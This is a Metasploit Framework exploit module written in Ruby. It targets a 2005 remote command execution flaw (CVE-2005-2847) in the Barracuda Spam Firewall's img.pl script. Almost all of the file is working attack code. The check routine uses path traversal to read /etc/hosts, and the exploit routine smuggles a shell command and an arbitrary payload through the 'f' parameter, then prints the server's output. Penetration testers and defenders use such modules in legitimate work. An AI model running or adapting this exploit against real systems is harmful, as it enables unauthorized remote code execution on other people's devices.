##
# $Id: barracuda_img_exec.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Barracuda IMG.PL Remote Command Execution',
			'Description'    => %q{
					This module exploits an arbitrary command execution vulnerability in the
				Barracuda Spam Firewall appliance. Versions prior to  3.1.18 are vulnerable.
			},
			'Author'         => [ 'Nicolas Gregoire <ngregoire[at]exaprobe.com>', 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					['CVE', '2005-2847'],
					['OSVDB', '19279'],
					['BID', '14712'],
					['NSS', '19556'],
					['URL', 'http://www.securiweb.net/wiki/Ressources/AvisDeSecurite/2005.1'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Space'       => 4000,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic perl ruby bash telnet',
						}
				},
			'Platform'       => 'unix',
			'Arch'           => ARCH_CMD,
			'Targets'        => [[ 'Automatic', { }]],
			'DisclosureDate' => 'Sep 01 2005',
			'DefaultTarget' => 0))

		register_options(
			[
				OptString.new('URI', [true, "The full URI path to img.pl", "/cgi-bin/img.pl"]),
			], self.class)
	end

	def check
		res = send_request_cgi({
			'uri'      => datastore['URI'],
			'vars_get' =>
			{
				'f' => ("../" * 8) + "etc/hosts"
			}
		}, 25)

		if (res and res.body.match(/localhost/))
			return Exploit::CheckCode::Vulnerable
		end

		return Exploit::CheckCode::Safe
	end

	def exploit
		res = send_request_cgi({
			'uri'      => datastore['URI'],
			'vars_get' =>
			{
				'f' => ("../" * 8) + %Q!bin/sh -c "echo 'YYY'; #{payload.encoded}; echo 'YYY'"|!
			}
		}, 25)

		if (res)
			print_status("The server returned: #{res.code} #{res.message}")
			print("")

			m = res.body.match(/YYY(.*)YYY/)

			if (m)
				print_status("Command output from the server:")
				print(m[1])
			else
				print_status("This server may not be vulnerable")
			end

		else
			print_status("No response from the server")
		end
	end

end
